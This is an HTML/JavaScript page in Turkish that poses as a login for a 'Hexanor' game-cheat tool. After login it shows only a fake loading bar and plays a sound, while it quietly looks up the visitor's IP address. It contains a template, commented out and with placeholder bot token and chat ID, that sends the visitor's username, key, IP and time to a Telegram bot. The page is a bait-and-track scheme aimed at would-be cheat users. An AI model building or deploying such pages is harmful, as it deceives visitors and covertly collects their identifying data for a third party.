<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hexanor Cheat</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
            color: #fff;
            min-height: 100vh;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 500px;
            background: rgba(15, 23, 42, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            position: relative;
        }

        .header h1 {
            font-size: 2.5rem;
            background: linear-gradient(90deg, #00dbde, #fc00ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            letter-spacing: 2px;
        }

        .header p {
            color: #a5b4fc;
            font-size: 1rem;
        }

        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2rem;
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #c7d2fe;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            color: white;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
        }

        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            letter-spacing: 1px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .btn:active {
            transform: translateY(0);
        }

        .error-message {
            background: rgba(239, 68, 68, 0.2);
            border: 1px solid rgba(239, 68, 68, 0.5);
            color: #fecaca;
            padding: 12px;
            border-radius: 8px;
            margin-top: 15px;
            display: none;
            text-align: center;
        }

        .loading-container {
            display: none;
            text-align: center;
            margin-top: 30px;
        }

        .loading-text {
            font-size: 1.8rem;
            margin-bottom: 20px;
            color: #a5b4fc;
        }

        .progress-bar {
            width: 100%;
            height: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
        }

        .progress {
            height: 100%;
            background: linear-gradient(90deg, #00dbde, #fc00ff);
            border-radius: 10px;
            width: 0%;
            transition: width 0.5s ease;
        }

        .percentage {
            font-size: 1.5rem;
            font-weight: bold;
            color: #a5b4fc;
            margin-bottom: 30px;
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            color: #a5b4fc;
            font-size: 0.9rem;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }

        .telegram-link {
            color: #0088cc;
            text-decoration: none;
            font-weight: bold;
        }

        .telegram-link:hover {
            text-decoration: underline;
        }

        .audio-controls {
            margin-top: 20px;
            display: none;
        }

        .audio-btn {
            background: linear-gradient(90deg, #f7971e, #ffd200);
            color: #000;
            border: none;
            padding: 12px 24px;
            border-radius: 50px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin: 0 auto;
        }

        .success-message {
            background: rgba(34, 197, 94, 0.2);
            border: 1px solid rgba(34, 197, 94, 0.5);
            color: #bbf7d0;
            padding: 12px;
            border-radius: 8px;
            margin-top: 15px;
            display: none;
            text-align: center;
        }

        @media (max-width: 600px) {
            .container {
                padding: 20px;
                border-radius: 15px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <i class="fas fa-gamepad"></i>
        </div>
        
        <div class="header">
            <h1>Hexanor Cheat</h1>
            <p>Premium oyun hileleri için giriş yapın</p>
        </div>
        
        <div id="loginForm">
            <div class="form-group">
                <label for="username"><i class="fas fa-user"></i> Kullanıcı Adı</label>
                <input type="text" id="username" placeholder="Kullanıcı adınızı girin">
            </div>
            
            <div class="form-group">
                <label for="key"><i class="fas fa-key"></i> Lisans Anahtarı</label>
                <input type="text" id="key" placeholder="Hexanor-1day">
            </div>
            
            <button class="btn" id="loginBtn">
                <i class="fas fa-sign-in-alt"></i> Giriş Yap
            </button>
            
            <div class="error-message" id="errorMessage">
                <i class="fas fa-exclamation-triangle"></i> Hatalı lisans anahtarı! Doğru anahtar: Hexanor-1day
            </div>
            
            <div class="success-message" id="successMessage">
                <i class="fas fa-check-circle"></i> Başarıyla giriş yapıldı! Hile yükleniyor...
            </div>
        </div>
        
        <div class="loading-container" id="loadingContainer">
            <div class="loading-text">
                <i class="fas fa-download"></i> HİLE YÜKLENİYOR
            </div>
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
            <div class="percentage" id="percentage">%0</div>
            
            <div class="audio-controls" id="audioControls">
                <button class="audio-btn" id="audioBtn">
                    <i class="fas fa-volume-up"></i> SESİ DURDUR
                </button>
            </div>
        </div>
        
        <div class="footer">
            <p>Yapan: <a href="https://t.me/HexanorCoder" class="telegram-link" target="_blank">Telegram @HexanorCoder</a></p>
            <p style="margin-top: 10px; font-size: 0.8rem;">© 2023 Hexanor Cheat. Tüm hakları saklıdır.</p>
        </div>
    </div>

    <script>
        // API endpoint (Bu kısmı kendi sunucunuza göre değiştirin)
        const API_URL = "https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage";
        // Yukarıdaki URL'yi kendi Telegram bot token'ınızla değiştirin
        
        // Doğru anahtar
        const CORRECT_KEY = "Hexanor-1day";
        
        // DOM elementleri
        const loginForm = document.getElementById('loginForm');
        const loadingContainer = document.getElementById('loadingContainer');
        const errorMessage = document.getElementById('errorMessage');
        const successMessage = document.getElementById('successMessage');
        const progress = document.getElementById('progress');
        const percentage = document.getElementById('percentage');
        const audioControls = document.getElementById('audioControls');
        const loginBtn = document.getElementById('loginBtn');
        const audioBtn = document.getElementById('audioBtn');
        
        // Ses dosyası (örnek bir ses - kendi ses dosyanızın URL'sini buraya ekleyin)
        let audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-game-show-suspense-waiting-667.mp3');
        audio.loop = true;
        let isPlaying = false;
        
        // IP adresi almak için fonksiyon
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return "IP alınamadı";
            }
        }
        
        // API'ye veri gönderme (bu örnekte çalışmaz, kendi API'nizi kullanmalısınız)
        async function sendToAPI(username, userKey, userIP) {
            // Bu kısım gerçek API'nize göre değiştirilecek
            console.log("API'ye gönderilen veriler:");
            console.log("Kullanıcı Adı:", username);
            console.log("Girilen Key:", userKey);
            console.log("IP Adresi:", userIP);
            console.log("Tarih:", new Date().toLocaleString('tr-TR'));
            
            // Telegram botuna mesaj gönderme örneği
            // Gerçek uygulamada bu kısmı kendi bot token ve chat ID'nizle değiştirmelisiniz
            /*
            const message = `Yeni giriş yapıldı!\nKullanıcı: ${username}\nKey: ${userKey}\nIP: ${userIP}\nTarih: ${new Date().toLocaleString('tr-TR')}`;
            
            try {
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: "YOUR_CHAT_ID",
                        text: message
                    })
                });
                console.log("Telegram mesajı gönderildi:", response.ok);
            } catch (error) {
                console.error("Telegram mesajı gönderilemedi:", error);
            }
            */
        }
        
        // Giriş butonu tıklama olayı
        loginBtn.addEventListener('click', async function() {
            const username = document.getElementById('username').value.trim();
            const userKey = document.getElementById('key').value.trim();
            
            if (!username) {
                errorMessage.textContent = "Lütfen kullanıcı adı girin!";
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                return;
            }
            
            if (userKey !== CORRECT_KEY) {
                errorMessage.textContent = "Hatalı lisans anahtarı! Doğru anahtar: Hexanor-1day";
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                return;
            }
            
            // Başarılı giriş
            errorMessage.style.display = 'none';
            successMessage.style.display = 'block';
            
            // Kullanıcı bilgilerini ve IP'yi al
            const userIP = await getIP();
            
            // API'ye veri gönder
            await sendToAPI(username, userKey, userIP);
            
            // 1 saniye bekle ve loading ekranını göster
            setTimeout(() => {
                loginForm.style.display = 'none';
                successMessage.style.display = 'none';
                loadingContainer.style.display = 'block';
                
                // Yükleme animasyonunu başlat
                startLoading();
            }, 1500);
        });
        
        // Yükleme animasyonu
        function startLoading() {
            let width = 0;
            const interval = setInterval(() => {
                width += 1;
                progress.style.width = width + '%';
                percentage.textContent = '%' + width;
                
                if (width >= 100) {
                    clearInterval(interval);
                    
                    // Yükleme tamamlandığında sesi başlat
                    setTimeout(() => {
                        audio.play();
                        isPlaying = true;
                        audioControls.style.display = 'block';
                    }, 500);
                }
            }, 50);
        }
        
        // Ses kontrol butonu
        audioBtn.addEventListener('click', function() {
            if (isPlaying) {
                audio.pause();
                audioBtn.innerHTML = '<i class="fas fa-volume-mute"></i> SESİ BAŞLAT';
                isPlaying = false;
            } else {
                audio.play();
                audioBtn.innerHTML = '<i class="fas fa-volume-up"></i> SESİ DURDUR';
                isPlaying = true;
            }
        });
        
        // Enter tuşu ile giriş yapma
        document.addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                loginBtn.click();
            }
        });
        
        // Sayfa yüklendiğinde inputlara odaklan
        window.onload = function() {
            document.getElementById('username').focus();
        };
    </script>
</body>
</html>
